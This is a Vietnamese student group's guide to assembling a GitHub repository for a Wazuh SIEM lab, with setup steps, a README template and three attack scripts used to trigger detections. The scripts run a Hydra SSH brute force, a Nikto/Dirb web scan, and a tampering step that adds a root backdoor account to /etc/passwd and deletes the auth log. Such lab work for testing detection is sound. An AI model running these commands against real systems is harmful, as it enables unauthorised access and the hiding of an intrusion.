# 📁 Hướng dẫn xây dựng Repository GitHub — Nhóm SIEM

## 1. Cấu trúc thư mục repo
```
siem-wazuh-lab/
│
├── README.md                          ← TV2 viết (hướng dẫn re-implement toàn bộ)
│
├── manager/                           ← TV1 phụ trách
│   ├── docker-compose.yml             ← File Docker Compose chạy Wazuh Manager
│   ├── ossec.conf                     ← Cấu hình Manager (alert level, FIM, v.v.)
│   └── integrations/
│       └── telegram-alert.sh          ← Script gửi cảnh báo Telegram (nếu có)
│
├── agent/                             ← TV2 phụ trách
│   ├── ossec.conf                     ← Cấu hình Agent (localfile log sources)
│   └── install-agent.sh               ← Script cài đặt + đăng ký Agent
│
├── rules/                             ← TV3 phụ trách
│   └── local_rules.xml                ← Toàn bộ custom rules do TV3 viết
│
├── attack-scripts/                    ← TV3 phụ trách
│   ├── brute_force_ssh.sh             ← Script chạy Hydra tấn công SSH
│   ├── web_scan.sh                    ← Script chạy Nikto/Dirb quét web
│   └── file_tampering.sh              ← Script thực hiện sửa /etc/passwd
│
└── docs/
    ├── topology.png                   ← Sơ đồ mạng (TV1 vẽ, export PNG)
    └── screenshots/                   ← Ảnh chụp màn hình demo (TV3 bổ sung)
        ├── kb1-hydra-running.png
        ├── kb1-wazuh-alert.png
        ├── kb1-telegram-alert.png
        ├── kb2-nikto-running.png
        ├── kb2-wazuh-404-spike.png
        ├── kb3-ssh-tampering.png
        └── kb3-fim-alert.png
```
---

## 2. Hướng dẫn từng thành viên đóng góp vào repo

### TV1 — Manager & Docker

**Việc cần làm:**


2. Tải file `docker-compose.yml` từ máy chủ Azure xuống máy:
````bash
   scp user@<azure-ip>:~/wazuh/docker-compose.yml ./manager/docker-compose.yml
````

3. Tải file cấu hình Manager:
````bash
   scp user@<azure-ip>:/var/ossec/etc/ossec.conf ./manager/ossec.conf
````

4. **Trước khi commit**, kiểm tra và xóa thông tin nhạy cảm trong 2 file trên:
   - Thay token Telegram thật bằng `YOUR_TELEGRAM_TOKEN`
   - Thay IP thật của máy agent bằng `AGENT_IP`
   - Thay password Azure bằng `YOUR_PASSWORD`

5. Commit và push:
````bash
   git add manager/
   git commit -m "feat: add Manager docker-compose and ossec.conf"
   git push
````

---

### TV2 — Agent & README

**Việc cần làm:**

1. Tải file cấu hình Agent từ máy Ubuntu nạn nhân:
````bash
   scp user@<victim-ip>:/var/ossec/etc/ossec.conf ./agent/ossec.conf
````

2. Tạo file `agent/install-agent.sh` — ghi lại lệnh `curl` đã dùng để cài Agent:
````bash
   #!/bin/bash
   # Cài đặt Wazuh Agent và đăng ký với Manager
   # Thay MANAGER_IP bằng IP thực của máy TV1

   WAZUH_MANAGER="MANAGER_IP" \
   WAZUH_AGENT_NAME="victim-ubuntu" \
   bash <(curl -s https://packages.wazuh.com/4.x/wazuh-install.sh) --agent

   sudo systemctl enable --now wazuh-agent
````

3. Viết file `README.md` theo template ở Mục 3 bên dưới.

4. Commit và push:
````bash
   git add agent/ README.md
   git commit -m "feat: add Agent config and README"
   git push
````

---

### TV3 — Rules & Attack Scripts

**Việc cần làm:**

1. Lấy file custom rules từ máy Manager (nhờ TV1 lấy hộ hoặc truy cập trực tiếp):
   - Copy toàn bộ nội dung `/var/ossec/etc/rules/local_rules.xml`
   - Dán vào file `rules/local_rules.xml` trong repo

2. Tạo 3 file script tấn công trong `attack-scripts/`:

   **`brute_force_ssh.sh`**
````bash
   #!/bin/bash
   # Kịch bản 1: SSH Brute-force
   # Thay VICTIM_IP bằng IP thực của máy nạn nhân (TV2)
   hydra -l ubuntu \
         -P ../wordlists/pass.txt \
         ssh://VICTIM_IP \
         -t 4 -V
````

   **`web_scan.sh`**
````bash
   #!/bin/bash
   # Kịch bản 2: Web Directory Scan
   nikto -h http://VICTIM_IP
   dirb http://VICTIM_IP /usr/share/wordlists/dirb/common.txt
````

   **`file_tampering.sh`**
````bash
   #!/bin/bash
   # Kịch bản 3: File Tampering (chạy SAU KHI đã SSH vào máy nạn nhân)
   # Thêm tài khoản backdoor
   echo "hacker:x:0:0:root backdoor:/root:/bin/bash" | sudo tee -a /etc/passwd
   # Xóa auth log để xóa dấu vết
   sudo rm -f /var/log/auth.log
````

3. Bỏ file wordlist vào `wordlists/pass.txt` (dùng list ngắn ~50 mật khẩu, không commit rockyou.txt vì quá nặng).

4. Sau khi demo xong, bổ sung ảnh screenshot vào `docs/screenshots/`.

5. Commit và push:
````bash
   git add rules/ attack-scripts/ wordlists/ docs/
   git commit -m "feat: add custom rules, attack scripts and screenshots"
   git push
````

---

## 3. Template README.md — TV2 viết

> Copy phần dưới vào file `README.md` ở root repo, rồi điền thông tin thực tế vào các chỗ `[...]`.


# SIEM Lab — Wazuh Security Monitoring

Môn: Mật Mã và An Ninh Mạng (CO3069) | Nhóm: [Tên nhóm]  
Giải pháp: **Wazuh SIEM** triển khai trên Docker (Azure) + Agent trên Ubuntu VM

---

## Kiến trúc hệ thống

![Topology](docs/topology.png)

| Thành phần | Hệ điều hành | Vai trò |
|---|---|---|
| Wazuh Manager (Azure VPS) | Ubuntu Server 22.04 | SIEM Core — TV1 |
| Máy nạn nhân (VM) | Ubuntu 22.04 | Wazuh Agent — TV2 |
| Máy tấn công (VM) | Kali Linux 2024 | Red Team — TV3 |

---

## Yêu cầu trước khi chạy

- Docker + Docker Compose (trên máy Manager)
- Tailscale đã cài và đăng nhập trên cả máy Manager và máy Agent
- Kali Linux có sẵn Hydra, Nikto, Dirb (mặc định có trong Kali)

---

## Bước 1 — Khởi động Wazuh Manager (TV1 thực hiện)

```bash
# Clone repo
git clone https://github.com/[username]/siem-wazuh-lab.git
cd siem-wazuh-lab/manager

# Điền các biến môi trường vào docker-compose.yml trước khi chạy:
# - TELEGRAM_TOKEN: token bot Telegram của nhóm
# - TELEGRAM_CHAT_ID: chat ID của group Telegram

# Khởi động Manager
docker compose up -d

# Kiểm tra trạng thái
docker compose ps
```

Sau khi chạy, truy cập Dashboard tại: `https://[MANAGER_IP]` (tài khoản mặc định: `admin`)

---

## Bước 2 — Cài đặt Agent trên máy nạn nhân (TV2 thực hiện)

```bash
cd siem-wazuh-lab/agent

# Sửa MANAGER_IP trong file install-agent.sh thành IP Tailscale của TV1
nano install-agent.sh

# Chạy script cài đặt
chmod +x install-agent.sh
sudo ./install-agent.sh

# Kiểm tra agent đã kết nối chưa
sudo systemctl status wazuh-agent
```

Xác nhận thành công: Agent hiển thị trạng thái **Active** trên Wazuh Dashboard.

---

## Bước 3 — Nạp Custom Rules vào Manager (TV1 thực hiện sau khi có file từ TV3)

```bash
# Copy file rules vào Manager container
docker cp rules/local_rules.xml \
  wazuh-manager:/var/ossec/etc/rules/local_rules.xml

# Khởi động lại Manager để áp dụng rules
docker exec wazuh-manager /var/ossec/bin/wazuh-control restart
```

---

## Bước 4 — Chạy kịch bản tấn công (TV3 thực hiện trên Kali Linux)

```bash
cd siem-wazuh-lab/attack-scripts

# Sửa VICTIM_IP trong từng script thành IP Tailscale của máy TV2
# rồi chạy từng kịch bản:

# KB1: SSH Brute-force
chmod +x brute_force_ssh.sh && ./brute_force_ssh.sh

# KB2: Web Directory Scan
chmod +x web_scan.sh && ./web_scan.sh

# KB3: File Tampering (chạy sau khi KB1 tìm được mật khẩu)
ssh ubuntu@VICTIM_IP
chmod +x file_tampering.sh && ./file_tampering.sh
```

Quan sát kết quả trên **Wazuh Dashboard** và kiểm tra **Telegram** của nhóm.

---

## Kết quả demo

| Kịch bản | Công cụ | Alert Level | Phát hiện |
|---|---|---|---|
| KB1 — SSH Brute-force | Hydra | 10 | ✅ |
| KB2 — Web Dir Scan | Nikto + Dirb | 8–10 | ✅ |
| KB3 — File Tampering | SSH + shell | 12+ | ✅ |

Screenshot đầy đủ xem tại: [`docs/screenshots/`](docs/screenshots/)

---

## 4. Checklist hoàn thành repo

### TV1
- [ ] Tạo repo GitHub, đặt Private, mời TV2 và TV3
- [ ] Push `manager/docker-compose.yml` (đã xóa thông tin nhạy cảm)
- [ ] Push `manager/ossec.conf` (đã xóa token Telegram thật)
- [ ] Push `manager/integrations/telegram-alert.sh` (nếu có)
- [ ] Export và push `docs/topology.png`

### TV2
- [ ] Push `agent/ossec.conf`
- [ ] Push `agent/install-agent.sh` (có đủ lệnh để người khác chạy lại)
- [ ] Viết và push `README.md` hoàn chỉnh với đủ 4 bước
- [ ] Kiểm tra: người khác clone về và làm theo README có chạy được không

### TV3
- [ ] Push `rules/local_rules.xml` (toàn bộ custom rules)
- [ ] Push `attack-scripts/brute_force_ssh.sh`
- [ ] Push `attack-scripts/web_scan.sh`
- [ ] Push `attack-scripts/file_tampering.sh`
- [ ] Push `wordlists/pass.txt`
- [ ] Bổ sung đủ 7 ảnh screenshot vào `docs/screenshots/` sau khi demo

### Cả nhóm — kiểm tra cuối
- [ ] Clone repo về máy mới, làm theo README từ đầu → hệ thống chạy được
- [ ] Không có thông tin nhạy cảm nào bị commit (token, mật khẩu thật, IP thật)
- [ ] Tất cả script đã có comment giải thích, dễ đọc
- [ ] Link repo được điền vào Phụ lục của báo cáo LaTeX